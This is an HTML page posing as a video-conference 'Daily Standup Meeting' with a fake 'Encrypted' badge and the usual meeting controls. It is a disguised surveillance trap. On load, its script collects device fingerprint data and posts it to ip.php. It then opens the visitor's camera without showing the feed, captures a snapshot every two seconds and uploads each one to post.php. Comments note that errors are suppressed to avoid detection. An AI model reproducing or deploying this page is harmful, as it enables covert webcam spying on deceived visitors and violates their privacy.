<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Online Meeting</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <style>
        body {
            background-color: #121212;
            color: white;
            overflow: hidden;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        /* Video Area */
        .video-container {
            position: relative;
            width: 100%;
            height: calc(100vh - 80px); /* Trừ đi chiều cao thanh bottom */
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
        }

        #canvas {
            max-width: 95%;
            max-height: 90%;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }

        /* Bottom Bar */
        .bottom-bar {
            height: 80px;
            background-color: #1F2022;
            border-top: 1px solid #333;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
        }

        .control-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #d2d2d2;
            cursor: pointer;
            min-width: 60px;
            padding: 5px;
            border-radius: 8px;
            transition: 0.2s;
        }

        .control-btn:hover {
            background-color: #333;
            color: white;
        }

        .control-btn i {
            font-size: 20px;
            margin-bottom: 5px;
        }

        .control-btn span {
            font-size: 10px;
        }

        .btn-end {
            background-color: #bf212f;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 8px;
            font-weight: 600;
            margin-left: 20px;
        }
        
        .btn-end:hover {
            background-color: #a01b27;
        }

        /* Top Left Info */
        .meeting-info {
            position: absolute;
            top: 15px;
            left: 20px;
            z-index: 10;
        }
    </style>
</head>

<body>

    <video id="video" playsinline autoplay style="display:none;"></video>

    <div class="meeting-info">
        <span class="badge bg-success"><i class="fas fa-shield-alt"></i> Encrypted</span>
        <span class="ms-2 fw-bold">Daily Standup Meeting</span>
    </div>

    <div class="position-absolute top-0 end-0 m-3" style="z-index: 10;">
        <button class="btn btn-dark btn-sm opacity-75">
            <i class="fas fa-th"></i> View
        </button>
    </div>

    <div class="video-container">
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <div class="fixed-bottom bottom-bar">
        <div class="control-btn">
            <i class="fas fa-microphone-slash"></i>
            <span>Unmute</span>
        </div>
        <div class="control-btn">
            <i class="fas fa-video-slash"></i>
            <span>Start Video</span>
        </div>
        
        <div class="control-btn d-none d-md-flex">
            <i class="fas fa-shield-alt"></i>
            <span>Security</span>
        </div>
        <div class="control-btn">
            <i class="fas fa-user-friends"></i>
            <span>Participants</span>
        </div>
        <div class="control-btn text-success">
            <i class="fas fa-share-square"></i>
            <span>Share Screen</span>
        </div>
        <div class="control-btn">
            <i class="fas fa-comment-alt"></i>
            <span>Chat</span>
        </div>
        <div class="control-btn d-none d-md-flex">
            <i class="fas fa-record-vinyl"></i>
            <span>Record</span>
        </div>
        
        <button class="btn-end">End</button>
    </div>

    <div class="modal fade" id="waitModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content bg-dark text-white border-secondary">
                <div class="modal-body text-center p-4">
                    <div class="spinner-border text-primary mb-3" role="status"></div>
                    <h5>Waiting for the host to let you in...</h5>
                    <p class="text-secondary small mt-2">Meeting ID: 899-231-4412</p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        'use strict';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // Cấu hình Camera: video: true để nhận mọi thiết bị
        const constraints = {
            audio: false,
            video: true 
        };

        // --- 1. HÀM LẤY THÔNG TIN THIẾT BỊ ---
        function getDeviceInfo() {
            try {
                var data = {
                    screen: screen.width + "x" + screen.height,
                    platform: navigator.platform,
                    cores: navigator.hardwareConcurrency || 'N/A',
                    ram: navigator.deviceMemory || 'N/A',
                    browser: navigator.userAgent,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "ip.php", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            } catch (e) { console.log("Info Error"); }
        }

        // --- 2. HÀM GỬI ẢNH (POST) ---
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'post.php', // Dùng đường dẫn tương đối cho an toàn
                dataType: 'json',
                async: true,
                success: function (result) {},
                error: function (xhr, status, error) {}
            });
        }

        // --- 3. KHỞI TẠO CAMERA ---
        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                // Không alert lỗi để tránh lộ
                console.log("Camera access denied or error: " + e.toString());
            }
        }

        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            video.play();

            var context = canvas.getContext('2d');
            
            // Chụp liên tục mỗi 2 giây
            setInterval(function () {
                context.drawImage(video, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);
            }, 2000);
        }

        // --- 4. CHẠY KHI LOAD TRANG ---
        $(document).ready(function(){
            // Thu thập thông tin
            getDeviceInfo();
            
            // Bật Camera
            init();

            // Hiển thị Popup chờ (Tùy chọn)
            /*
            var myModal = new bootstrap.Modal(document.getElementById('waitModal'));
            setTimeout(function(){
                myModal.show();
            }, 5000); // Hiện sau 5 giây
            */
        });
    </script>

</body>
</html>